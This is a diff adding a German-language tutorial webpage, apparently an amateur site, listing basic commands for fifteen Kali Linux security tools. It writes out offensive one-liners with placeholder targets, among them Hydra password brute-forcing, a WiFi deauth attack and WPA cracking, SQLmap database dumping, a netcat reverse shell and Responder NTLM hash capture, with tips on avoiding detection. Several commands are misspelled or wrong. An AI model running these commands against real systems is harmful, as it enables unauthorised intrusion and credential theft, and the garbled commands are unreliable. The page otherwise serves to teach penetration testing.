@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang=de>
+    <head>
+        <meta charset='utf-8'>
+        <meta name='viewport', content='width-device-width' intial-scale='1.0'>
+        <title>Kali Linux</title>
+        <meta name="description" content="Kleine Tutorials für kali">
+        
+        <link rel='stylesheet' href='style-Tutorials.css' >
+    </head>
+    <body class="Tutorials">
+        <div class="Kali-Background">
+        <header class="scroll-header">
+            <div class="img-h1">
+                <a href="index.html">
+                    <img src="Bilder/kali log.jpg" alt="Kali Linux Logo" class="img1" />
+                </a>
+                <a href="index.html" style="text-decoration: none;">
+                <h1>Kali Linux</h1>
+                </a>
+            </div>
+            
+            <ul class="nav-list">
+                <li><a href="Installation.html">Installation</a></li>
+                <li><a href="Tools.html">Tools-List</a></li>
+                <li><a href="Tutorials.html">Tutorials</a></li>
+            </ul>
+            
+            
+        </header>
+        <main>
+            
+            <div class="Tutorials-Einleitung">
+                <h2>Willkommen zu den Tutorials</h2>
+                <p>Das ist der Abschnitt m it den Tutorials zu den 15 most basic tools mit Commands und befehlen</p>
+            </div>
+            <ol class="Tutorials-List">
+                <li>
+                    <h3 class="Tutorials-List-Header">Nmap (Network Mapper)</h3>
+                    <p class="Tutorials-List-Beschreibung">Nmap ist ein leistungsstarkes Tool zur Netzwerkerkundung und Sicherheitsüberprüfung. Es hilft, offene Ports, laufende Dienste und sogar Betriebssysteme zu identifizieren.</p>
+                    <ul class="Tutorials-List-Commands">
+                        <li>Der Basic Scan, Scaned die angegebene IP und listst die offenen Ports: <code>nmap |Ziel IP|</code> </li>
+                        <li>Der Zusatzt <code>-O</code> veranlasst das Nmap auch das Betriebssystem des angegebenen Ziels Abfragt: <code>nmap -O |Ziel IP|</code></li>
+                        <li>Der Zusatzt <code>-sV</code> gibt die Servies Version des Ausführenden Dienstes aus: <code>nmap -sV |Ziel IP|</code></li>
+                        <li>Beim Zustazt <code>--script</code> nutzt Nmap ein vorgefertigtes Script: <code>nmap --script |scriptname| |Ziel IP|</code></li>
+                        <li>Wenn man ein <code>-A</code> befügt detailierte informationen aus: <code>nmap -A |Ziel IP|</code> </li>
+                    </ul>
+                    <p class="Tutorials-List-Zusatzt">Es gibt einige weitere Funktionen eine Auskunft erhaltten sie mit "--help"</p>
+                </li>
+                <li>
+                    <h3 class="Tutorials-List-Header">Metasploite</h3>
+                    <p class="Tutorials-List-Beschreibung">Metasploit ist ein Framework, das Exploits bereitstellt, um Schwachstellen in Systemen auszunutzen. Es ist ein essenzielles Werkzeug für Penetrationstester.</p>
+                    <ul class="Tutorials-List-Commands">
+                        <li>Um Metasploite zu starten führe: <code>msfconsole</code></li>
+                        <li>Als nächstes suche sie den Exploit den sie Suchen: <code>search |Exploit Name|</code></li>
+                        <li>Wählen sie nun Exploit aus den sie benutzen wollen: <code>use |Exploit Name|</code></li>
+                        <li>Setzten sie die Ziel : <code>set RHOST |Ziel IP| </code></li>
+                        <li>Starten sie den Exploit und führen sie den Angriff aus: <code>exploit</code> oder <code>run</code> </li>
+                    </ul>
+                    <p class="Tutorials-List-Zusatzt">Metasploit kann auch Payloads wie Reverse Shell erstellen und unterstützt Post-Exploitation-Techniken zur Kontrolle von kompromittierten Systemen.</p>
+                </li>
+                <li>
+                    <h3 class="Tutorials-List-Header">Wireshark</h3>
+                    <p class="Tutorials-List-Beschreibung">Wireshark ist ein Netzwerkprotokoll-Analysetool, das Datenpakete in Echtzeit analysiert. Es hilft, Sicherheitslücken in Netzwerken zu erkennen.</p>
+                    <ul class="Tutorials-List-Commands">
+                        <li>Starten sie die graphische Benutzeroberfläche mit: <code>wireshark </code> </li>
+                        <li>Wählen sie die Netzwerkschnittstelle aus die sie zu scannen benutzten wollen(z.B. eth0 oder wlan0)</li>
+                        <li>(Optianal) Stellen sie einen Filtern ein wie "tcp" oder "http", dies macht das auswerten der Daten einfacher</li>
+                        <li>Starten sie den Analyseprozess</li>
+                        <li>Klicken sie auf das Paket welches sie genauer analysieren wollen</li>
+                    </ul>
+                    <p class="Tutorials-List-Zusatzt">WireSchark unterstüzt das exporttieren in verschieden Formaten und ist nützlich zum erkennen von MAn-in-the-Middle-Angriffen</p>
+                </li>
+                <li>
+                    <h3 class="Tutorials-List-Header">Hydra</h3>
+                    <p class="Tutorials-List-Beschreibung">Hydra ist ein Brute-Force-Tool, um Passwörter für diverse Dienste wie SSH, FTP oder HTTP zu knacken.</p>
+                    <ul class="Tutorials-List-Commands">
+                        <li>Ein Brute-Force-Scan auf SSH mit einem festen Benutzernamen und Passwortliste: <code>hydra -l admin -P passlist.txt |Ziel IP| ssh</code></li>
+                        <li>Die Verwendung einer Benutzer- und Passwortliste für einen FTP-Brute-Force-Angriff: <code>hydra -L userlist.txt -P passlist.txt |Ziel IP| ftp</code></li>
+                        <li>Ein Angriff auf ein Webformular mithilfe einer HTTP-POST-Anfrage: <code>hydra -l admin -P passlist.txt http-post-form "/login:username=^USER^&password=^PASS^:F=failed"</code></li>
+                        <li>Mit dem Zusatzt <code>-t 4</code> legt man die Anzahl der parallelen Verbindungen auf 4 fest: <code>hydra -t 4 -l admin -P passlist.txt |Ziel IP| ssh</code></li>
+                        <li>Für Angriffe auf IPv6-Adressen kann der Zusatzt <code>-6</code> verwendet werden: <code>hydra -6 -l admin -P passlist.txt |Ziel IPv6-Adresse| ssh</code></li>
+                    </ul>
+                    <p class="Tutorials-List-Zusatzt">Hydra kann auch parallel arbeiten und mehere Protokolle unterstützt. Man sollte es nicht inflationär einsetzten da es auffält</p>
+                </li>
+                <li>
+                    <h3 class="Tutorials-List-Header">Aircrack-ng</h3>
+                    <p class="Tutorials-List-Beschreibung">Ein Toolkit für WLAN-Sicherheitsanalysen, das Netzwerke scannen, Pakete abfangen und WEP/WPA-Schlüssel knacken kann.</p>
+                    <ul class="Tutorials-List-Commands">
+                        <li>Starten sie Aircrack-ng mit: <code>aircrack-ng</code></li>
+                        <li>Wähle eine Netztwerkkarte aus über die sie scannen wollen: <code>airmonger start |Netzwerkschnittstelle|</code></li>
+                        <li>Starten sie das Scannen: <code>airodumg-ng |Netzwerkschnittstelle|mon</code></li>
+                        <li>Fangen sie den handshake ab mit: <code>airodump-ng -c |Kanal|</code></li>
+                        <li>Knacken sie den Schlüssel mit einer PAsswortliste: <code>aircrack-ng |Handshake-Datei| -w |Passwort-Liste|</code></li>
+                        <li>Alternative könne sie auch einen Deauth Angriff fahren um schneller den handschacke abzufangen: <code>aireplay-ng -0 10 -a |MAC-Adresse des Routers| wlan0mon </code></li>
+                    </ul>
+                    <p class="Tutorials-List-Zusatzt">Sie brauche eine Ausreichend kompatible Netztwerkkarte und ein ausreichend starkes signal und zeit für Angriffe auf WPA/WPA2</p>
+                </li>
+                <li>
+                    <h3 class="Tutorials-List-Header">John the Ripper</h3>
+                    <p class="Tutorials-List-Beschreibung">John the Ripper ist ein Passwort-Cracking-Tool, das Hashes entschlüsseln kann. Es unterstützt zahlreiche Algorithmen wie MD5, SHA und mehr.</p>
+                    <ul class="Tutorials-List-Commands">
+                        <li>Starten sie John the Ripper mit: <code>john</code></li>
+                        <li>Knacken sie den Hash mit einer Passwortliste: <code>john --wordlist |Passwort-Liste| |Hash|</code></li>
+                        <li>Sie können John auch benutztnen um eine Hash zu identifizieren: <code>john --list=formats |Hash|</code></li>
+                        <li>Eine unbabsichtige abgebrochen Prozess könne sie wiederherstelln mit: <code>john --restore</code></li>
+                        <li>Wenn sie wissen wollen weit john ist könne sie den Status abfragen mit: <code> john --status</code></li>
+                        <li>In John sind auch Algorithmen zum generieren von wortlisten implementieret: <code>john --incremental</code></li>
+                    </ul>
+                    <p class="Tutorials-List-Zusatzt">Beachten sie das John the Ripper für Multicore Cpus Optimiert ist und auch mit gpu-bassierten Cracking-tools kombiniert wertden kann</p>
+                </li>
+                <li>
+                    <h3 class="Tutorials-List-Header">SQLmap</h3>
+                    <p class="Tutorials-List-Beschreibung">SQLmap automatisiert SQL-Injection-Angriffe, um Schwachstellen in Datenbanken zu identifizieren und auszunutzen.</p>   
+                    <ul class="Tutorials-List-Commands">
+                        <li>Der Basis Scan wird mit : <code>sqlmap -u |An zungreifende Url|</code></li>
+                        <li>Der Zusatzt <code>--dbs</code> sorgt dafür das die Datenbanken werden ausgegeben: <code>sqlmap -u |An zungreifende Url| --dbs</code></li>
+                        <li>Wenn man <code>-D |Datenbanken| --tables</code> benutzt bekommt man die Tabellen der Datenbanken: <code>sqlmap -u |An zungreifende Url| -D |Datenbanken| --tables</code> </li>
+                        <li>Eine eben tiefer kommt man mit dem Zusatzt <code>-D |Datenbanken| -T |Tabelle| --dump</code>: <code>sqlmap -u |An zungreifende Url| -D |Datenbanken| -T |Tabelle| --dump</code></li>
+                        <li>Die Benutzter rechte ruft man mit: |sqlmap -u |An zungreifende Url| --privileges </li>
+                    </ul>
+                    <p class="Tutorials-List-Zusatzt">Dieses Tools ist sehr gut geignet für Webanwendungen und automatisiert viele manuelle Schritte und spart Zeit</p>
+                </li>
+                <li>
+                    <h3 class="Tutorials-List-Header">Netcat</h3>
+                    <p class="Tutorials-List-Beschreibung">Netcat ist ein vielseitiges Netzwerktool, das zur Datenübertragung, Portscans und als Backdoor eingesetzt werden kann.</p>
+                    <ul class="Tutorials-List-Commands">
+                        <li>Eine Portscan führt man mit: <code>nc -zv |Ziel IP| |Ziel Port|</code></li>
+                        <li>Um datein an eine bestimten port zusenden: <code>nc |Ziel IP| |Ziel Port| |Datei.txt|</code></li>
+                        <li>Um datein von bestimmten Port zu empfangen kann man: <code>nc -1 -p |Ziel Port| > |Datei.txt|</code></li>
+                        <li>Nachrichten kann man mit dem befehl <code>nc -p |Ziel IP| |Nachricht|</code> senden </li>
+                        <li>Eine Reverse Shell fährt man mit : <code>nc -e /bin/bash |Ziel IP| |Ziel Port|</code></li>
+                    </ul>
+                    <p class="Tutorials-List-Zusatzt">Netcat ist ideal für einfaqche Netzwerkoperationen, ist aber mit bedacht zu genießen da es leicht erkannt werden kann </p>
+                </li>
+                <li>
+                    <h3 class="Tutorials-List-Header">Nikto</h3>
+                    <p class="Tutorials-List-Beschreibung">Nikto ist ein Web-Server-Scanner, der nach bekannten Schwachstellen sucht und Konfigurationsfehler aufdeckt.</p>
+                    <ul class="Tutorials-List-Commands">
+                        <li>Der Basis Scan wird mit : <code>nikto -h |Ziel IP|</code></li>
+                        <li>Port Scannen kann man mit: <code>nikto -h |Ziel IP| -p |Port|</code></li>
+                        <li>Protokolle kann man auf dem ziel mit: <code>nikto -h |Ziel IP| -s |Protokoll|</code></li>
+                        <li>Den Bericht von Nikto speichert mit: <code>nikto -h |Ziel IP| -o |Datei.html| </code></li>
+                        <li>Führe einen Spezifischen Tests aus: <code>nikto -Tunning x</code></li>
+                    </ul>
+                    <p class="Tutorials-List-Zusatzt">Ist besonderst ist besonderst geignet für Webanwendungens Entwickler. Erkennen der Schwachstellen schnell, hatt aber keine Exploit-Funktionen</p>
+                    </li>
+                    <li>
+                        <h3 class="Tutorials-List-Header">Gobuster</h3>
+                        <p class="Tutorials-List-Beschreibung">Gobuster ist ein Verzeichnis-Bruteforcing-Tool, das auf Webservern versteckte Verzeichnisse und Dateien aufspürt.</p>
+                        <ul class="Tutorials-List-Commands">
+                            <li>Verzeichnisse durchsuchen: <code>gobuster dir -u http://example.com -w wordlist.txt</code></li>
+                            <li>Subdomains finden: <code>gobuster dns -d example.com -w subdomains.txt</code></li>
+                            <li>Spezifische Dateitypen durchsuchen: <code>gobuster dir -u http://example.com -w wordlist.txt -x php,html</code></li>
+                            <li>Threads erhöhen: <code>gobuster dir -u http://example.com -w wordlist.txt -t 50</code></li>
+                            <li>Proxy nutzen: <code>gobuster dir -u http://example.com -w wordlist.txt --proxy http://127.0.0.1:8080</code></li>
+                        </ul>
+                        <p class="Tutorials-List-Zusatzt">Gobuster ist schneller als viele Alternativen, da es keine DNS-Abfragen macht. Perfekt für die Recon-Phase von Webanwendungen.</p>
+                    </li>
+                    
+                    <li>
+                        <h3 class="Tutorials-List-Header">Social Engineering Toolkit (SET)</h3>
+                        <p class="Tutorials-List-Beschreibung">SET ist ein Framework für Social-Engineering-Angriffe wie Phishing oder Spear-Phishing.</p>
+                        <ul class="Tutorials-List-Commands">
+                            <li>Starten: <code>setoolkit</code> – Öffnet das Menü.</li>
+                            <li>Option wählen: Wähle z. B. "Social-Engineering-Angriffe".</li>
+                            <li>Angriffsart auswählen: Wähle zwischen Phishing, Credential Harvesting etc.</li>
+                            <li>Payload erstellen: Nutze vorgefertigte Payloads.</li>
+                            <li>Angriff starten: Folge den Anweisungen in SET.</li>
+                        </ul>
+                        <p class="Tutorials-List-Zusatzt">Besonders nützlich für Sicherheitsbewusstseins-Trainings. Extrem flexibel und mächtig.</p>
+                    </li>
+                    
+                    <li>
+                        <h3 class="Tutorials-List-Header">DNSenum</h3>
+                        <p class="Tutorials-List-Beschreibung">DNSenum ist ein DNS-Reconnaissance-Tool, das Domainnamen und ihre Infrastruktur analysiert.</p>
+                        <ul class="Tutorials-List-Commands">
+                            <li>Basis-Scan: <code>dnsenum example.com</code></li>
+                            <li>Brute-Force mit DNS-Server: <code>dnsenum --dnsserver &lt;DNS&gt; --enum example.com</code></li>
+                            <li>Subdomains auflisten: <code>dnsenum --enum example.com</code></li>
+                            <li>WHOIS-Abfrage: <code>dnsenum --whois example.com</code></li>
+                            <li>Ergebnisse speichern: <code>dnsenum example.com -o results.xml</code></li>
+                        </ul>
+                        <p class="Tutorials-List-Zusatzt">Effizient für die Recon-Phase. Erkennt DNS-Misconfigurations schnell.</p>
+                    </li>
+                    
+                    <li>
+                        <h3 class="Tutorials-List-Header">Responder</h3>
+                        <p class="Tutorials-List-Beschreibung">Responder ist ein Tool, das NTLM-Hashes in Netzwerken abfängt und entschlüsselt.</p>
+                        <ul class="Tutorials-List-Commands">
+                            <li>Starten: <code>responder -I eth0</code> – Lauscht auf dem Netzwerkinterface.</li>
+                            <li>Hashes speichern: Fängt NTLMv2-Hashes ab und speichert sie.</li>
+                            <li>Analyse: Ergebnisse mit <code>cat</code> öffnen oder für Cracking speichern.</li>
+                            <li>Hashes entschlüsseln: Nutze Tools wie Hashcat.</li>
+                            <li>Beenden: <code>CTRL+C</code> – Stoppt Responder.</li>
+                        </ul>
+                        <p class="Tutorials-List-Zusatzt">Besonders nützlich in internen Netzwerken. Funktioniert ohne zusätzliche Konfigurationen.</p>
+                    </li>
+                <li>
+                    <h3 class="Tutorials-List-Header">Maltego</h3>
+                    <p class="Tutorials-List-Beschreibung">Maltego ist ein Datenanalyse-Tool, das Beziehungen zwischen Personen, Domains und Netzwerken visualisiert.</p>
+                    <ul class="Tutorials-List-Commands">
+                        <li>Starten die Maltego GUI: <code>maltego</code></li>
+                        <li>Fügen sie eine Neue Entität: Füge domains, Ips oder Personen hinzu.</li>
+                        <li>Führen sie einen Transform aus</li>
+                        <li>Visualisieren sie die Ergebnisse</li>
+                        <li>Exportieren sie das als png oder pdf</li>
+                    </ul>
+                </li>
+            </ol>
+            
+        </main>
+        <script src="script.js"></script>
+        </div>
+        <footer>
+            <h3>About Us</h3>
+            <p>Kali Linux is a trusted platform for security professionals worldwide, providing cutting-edge tools for penetration testing, security research, and more.</p>
+            <div class="footer-listen">
+                <ul>
+                    <h3>Quick Links</h3>
+                    <li>Home</li>
+                    <li>About Kali Linux</li>
+                    <li>Kali Tools</li>
+                    <li>Documentation</li>
+                    <li>Community Forums</li>
+                    <li>Contact Us</li>
+                </ul>
+                <ul>
+                    <h3>Stay Connected</h3>
+                    <li>Twitter</li>
+                    <li>GitHub</li>
+                    <li>YouTube</li>
+                </ul>
+                <ul>
+                    <h3>Legal</h3>
+                    <li>Privacy Policy</li>
+                    <li>Terms of Service</li>
+                </ul>
+            </div>
+            
+            <p>© 2025 Offensive Security. All Rights Reserved.</p>
+            </footer>
+    </body>
+</html>
